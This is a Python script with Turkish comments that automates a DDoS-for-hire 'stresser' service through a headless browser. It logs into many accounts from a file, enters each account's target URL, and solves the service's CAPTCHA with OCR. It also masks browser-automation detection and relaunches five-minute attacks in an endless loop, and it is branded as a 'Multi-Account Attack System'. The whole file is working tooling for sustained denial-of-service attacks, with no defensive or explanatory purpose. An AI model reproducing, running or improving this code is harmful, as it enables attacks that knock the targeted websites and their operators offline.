# main.py
import threading
import time
import os
import re
import base64
import io
import shutil
import sys
import json
from datetime import datetime
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
from PIL import Image
import ddddocr
import requests
import logging

# Logging ayarları
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ddosnow.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# OCR başlat
ocr = ddddocr.DdddOcr()

class DDoSNowAutomation:
    def __init__(self):
        self.base_url = "https://cryptostresser.ba"
        self.accounts = self.load_accounts()
        self.running_states = {}
        self.stop_events = {}
        self.attack_threads = {}
        
    def load_accounts(self):
        """accounts.txt dosyasından hesapları yükle"""
        accounts = []
        if not os.path.exists("accounts.txt"):
            logger.error("accounts.txt dosyası bulunamadı!")
            # Örnek hesap oluştur
            with open("accounts.txt", "w") as f:
                f.write("test:deneme:https://example.com\n")
            return []
            
        with open("accounts.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                    
                parts = line.split(":")
                if len(parts) >= 3:  # kullanıcı:şifre:hedef_url
                    account = {
                        "username": parts[0],
                        "password": parts[1],
                        "target": parts[2]
                    }
                    accounts.append(account)
                elif len(parts) == 2:  # sadece kullanıcı:şifre
                    account = {
                        "username": parts[0],
                        "password": parts[1],
                        "target": "https://example.com"
                    }
                    accounts.append(account)
                    
        logger.info(f"{len(accounts)} hesap yüklendi")
        return accounts
    
    def solve_captcha(self, page):
        """Captcha çözümleme - sonsuz döngüde çalışır"""
        try:
            # Deploy Attack butonuna tıkla
            deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").first
            deploy_btn.click()
            time.sleep(2)
        except Exception as e:
            logger.warning(f"Deploy butonuna tıklanamadı: {e}")
            return False
            
        attempt = 0
        while True:
            attempt += 1
            try:
                # Captcha görselini bul
                img_elem = page.locator("img[alt='captcha']").first
                if not img_elem.count():
                    time.sleep(1)
                    continue
                    
                img_src = img_elem.get_attribute("src")
                if not img_src or not img_src.startswith("data:image"):
                    time.sleep(1)
                    continue
                    
                # Base64 verisini çöz
                base64_data = re.sub(r'^data:image/\w+;base64,', '', img_src)
                img_bytes = base64.b64decode(base64_data)
                img = Image.open(io.BytesIO(img_bytes))
                
                # OCR ile captcha çöz
                captcha_text = ocr.classification(img)
                captcha_text = re.sub(r'[^A-Z0-9]', '', captcha_text.upper())
                
                if not captcha_text:
                    time.sleep(1)
                    continue
                    
                logger.debug(f"OCR Sonucu: {captcha_text} (Deneme: {attempt})")
                
                # Captcha giriş alanını bul ve doldur
                captcha_input = page.locator("input[name='captcha']").first
                captcha_input.fill("")
                time.sleep(0.5)
                captcha_input.fill(captcha_text)
                time.sleep(1)
                
                # Deploy butonuna tıkla
                deploy_btn2 = page.locator("button[type='submit'][form='hubForm']").first
                if not deploy_btn2.count():
                    deploy_btn2 = page.locator("button.btn-confirm:has-text('Deploy Attack')").last
                deploy_btn2.click()
                time.sleep(3)
                
                # Hata kontrolü
                if page.locator("text=Invalid captcha code").count() > 0:
                    logger.info(f"Yanlış captcha: {captcha_text}, yeniden deneniyor...")
                    captcha_input.fill("")
                    time.sleep(1)
                    continue
                    
                # Başarılı
                logger.info("Attack başarıyla başlatıldı!")
                return True
                
            except Exception as e:
                logger.error(f"Captcha çözme hatası: {e}")
                time.sleep(2)
                continue
    
    def login_and_attack(self, account):
        """Hesap ile giriş yap ve saldırı başlat"""
        username = account["username"]
        password = account["password"]
        target_url = account["target"]
        
        # Profil klasörü oluştur
        profile_dir = os.path.join(os.getcwd(), f"profiles/profile_{username}")
        
        # Dış döngü: Kullanıcı durdurana kadar devam et
        while self.running_states.get(username, False):
            try:
                # Eski profili temizle
                if os.path.exists(profile_dir):
                    try:
                        shutil.rmtree(profile_dir)
                    except Exception as e:
                        logger.warning(f"Profil silinemedi: {e}")
                os.makedirs(profile_dir, exist_ok=True)
                
                with sync_playwright() as p:
                    # Browser'ı başlat
                    context = p.chromium.launch_persistent_context(
                        user_data_dir=profile_dir,
                        headless=True,
                        viewport={"width": 1280, "height": 720},
                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
                    )
                    page = context.new_page()
                    
                    # WebDriver tespitini engelle
                    page.add_init_script("""
                        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                        Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
                    """)
                    
                    # ---- GİRİŞ YAP ----
                    logger.info(f"[{username}] Giriş sayfasına gidiliyor...")
                    page.goto(f"{self.base_url}/login", timeout=60000)
                    page.wait_for_load_state("networkidle")
                    time.sleep(2)
                    
                    # Kullanıcı adı ve şifre gir
                    page.fill("input[name='username']", username)
                    page.fill("input[name='password']", password)
                    page.click("button[type='submit']")
                    time.sleep(3)
                    
                    # "Got it" butonuna tıkla
                    try:
                        got_it = page.locator("button:has-text('Got it')").first
                        if got_it.count() > 0:
                            got_it.click()
                            time.sleep(1)
                    except:
                        pass
                    
                    # Hub sayfasına git
                    logger.info(f"[{username}] Hub sayfasına gidiliyor...")
                    page.goto(f"{self.base_url}/hub", timeout=60000)
                    page.wait_for_load_state("networkidle")
                    time.sleep(2)
                    
                    # Giriş başarılı mı kontrol et
                    if "login" in page.url:
                        logger.error(f"[{username}] Giriş başarısız!")
                        time.sleep(30)
                        continue
                    
                    logger.info(f"[{username}] Giriş başarılı! Saldırı başlatılıyor...")
                    
                    # ---- ANA SALDIRI DÖNGÜSÜ ----
                    while self.running_states.get(username, False):
                        try:
                            # Hedef URL'yi gir
                            target_input = page.locator("input[name='hub.0.host']").first
                            target_input.fill(target_url, timeout=10000)
                            
                            # Süre gir (300 saniye = 5 dakika)
                            time_input = page.locator("input[name='hub.0.time']").first
                            time_input.fill("300", timeout=5000)
                            
                            # Captcha çöz
                            logger.info(f"[{username}] Captcha çözülüyor...")
                            if not self.solve_captcha(page):
                                logger.error(f"[{username}] Captcha çözülemedi!")
                                time.sleep(5)
                                page.reload()
                                continue
                            
                            # Saldırı aktif
                            logger.info(f"[{username}] Attack aktif, süre takibi başladı")
                            
                            # Süre takibi
                            while self.running_states.get(username, False):
                                try:
                                    # Badge kontrolü
                                    badge = page.locator(".accordion-button .badge").first
                                    if badge.count() > 0:
                                        time_text = badge.text_content().strip()
                                        logger.info(f"[{username}] Kalan süre: {time_text}")
                                        
                                        if time_text == "0m 0s" or time_text == "0s" or "0m 0s" in time_text:
                                            logger.info(f"[{username}] Süre doldu, yeniden başlatılıyor...")
                                            break
                                    else:
                                        # Running kontrolü
                                        running = page.locator(".stats-content .badge:has-text('Running')").first
                                        if running.count() == 0:
                                            logger.info(f"[{username}] Attack bitti (Running yok)")
                                            break
                                except Exception as e:
                                    logger.debug(f"[{username}] Süre kontrol hatası: {e}")
                                
                                time.sleep(5)
                            
                            if not self.running_states.get(username, False):
                                break
                            
                            # Sayfayı yenile ve döngüye devam et
                            logger.info(f"[{username}] Yeniden başlatılıyor...")
                            page.reload()
                            time.sleep(3)
                            
                            if "/hub" not in page.url:
                                page.goto(f"{self.base_url}/hub")
                                time.sleep(2)
                            
                        except (PlaywrightTimeout, Exception) as e:
                            logger.error(f"[{username}] İşlem hatası: {e}")
                            page.reload()
                            time.sleep(3)
                            continue
                    
                    # Durduruldu
                    if not self.running_states.get(username, False):
                        logger.info(f"[{username}] Saldırı durduruldu")
                        try:
                            trash_btn = page.locator(".btn-danger .fa-trash-alt").first
                            if trash_btn.count() > 0:
                                trash_btn.click()
                                logger.info(f"[{username}] Saldırı başarıyla durduruldu")
                                time.sleep(2)
                        except:
                            pass
                    
                    context.close()
                    
            except Exception as e:
                logger.error(f"[{username}] Kritik hata (tarayıcı yeniden başlatılacak): {e}")
                time.sleep(10)
                continue
    
    def start_account(self, account):
        """Hesap için saldırı başlat"""
        username = account["username"]
        
        if username in self.running_states and self.running_states[username]:
            logger.info(f"[{username}] Zaten çalışıyor!")
            return
        
        # Başlat
        self.running_states[username] = True
        self.stop_events[username] = threading.Event()
        
        # Thread başlat
        thread = threading.Thread(
            target=self.login_and_attack,
            args=(account,),
            daemon=True
        )
        self.attack_threads[username] = thread
        thread.start()
        logger.info(f"[{username}] Saldırı başlatıldı - Hedef: {account['target']}")
    
    def stop_account(self, username):
        """Hesabın saldırısını durdur"""
        if username in self.stop_events:
            self.stop_events[username].set()
        self.running_states[username] = False
        logger.info(f"[{username}] Durdurma sinyali gönderildi")
    
    def status_report(self):
        """Durum raporu"""
        logger.info("="*50)
        logger.info("AKTİF HESAPLAR:")
        for username, running in self.running_states.items():
            status = "Çalışıyor" if running else "Durduruldu"
            # Hedeft bilgisini bul
            target = "Bilinmiyor"
            for acc in self.accounts:
                if acc["username"] == username:
                    target = acc["target"]
                    break
            logger.info(f"  {username}: {status} - Hedef: {target}")
        logger.info("="*50)
    
    def run_all(self):
        """Tüm hesapları başlat"""
        if not self.accounts:
            logger.error("Hiç hesap yüklenemedi! accounts.txt dosyasını kontrol edin.")
            return
        
        logger.info(f"{len(self.accounts)} hesap başlatılıyor...")
        for account in self.accounts:
            self.start_account(account)
            time.sleep(2)  # Her hesap arasında küçük bekleme
        
        # Durum raporu
        self.status_report()
        
        # Sonsuz döngü - durum takibi
        try:
            while True:
                time.sleep(60)
                self.status_report()
        except KeyboardInterrupt:
            logger.info("Program durduruluyor...")
            for username in list(self.running_states.keys()):
                self.stop_account(username)
            logger.info("Tüm saldırılar durduruldu.")

def main():
    print("""
    ╔═══════════════════════════════════════════╗
    ║   DDoSNow.com Automation for Railway      ║
    ║   https://cryptostresser.ba               ║
    ║   Multi-Account Attack System             ║
    ╚═══════════════════════════════════════════╝
    """)
    
    # Railway için ortam değişkenleri
    if os.environ.get("RAILWAY_ENVIRONMENT"):
        logger.info("🚂 Railway ortamında çalışıyor...")
    
    # Başlat
    automation = DDoSNowAutomation()
    automation.run_all()

if __name__ == "__main__":
    main()
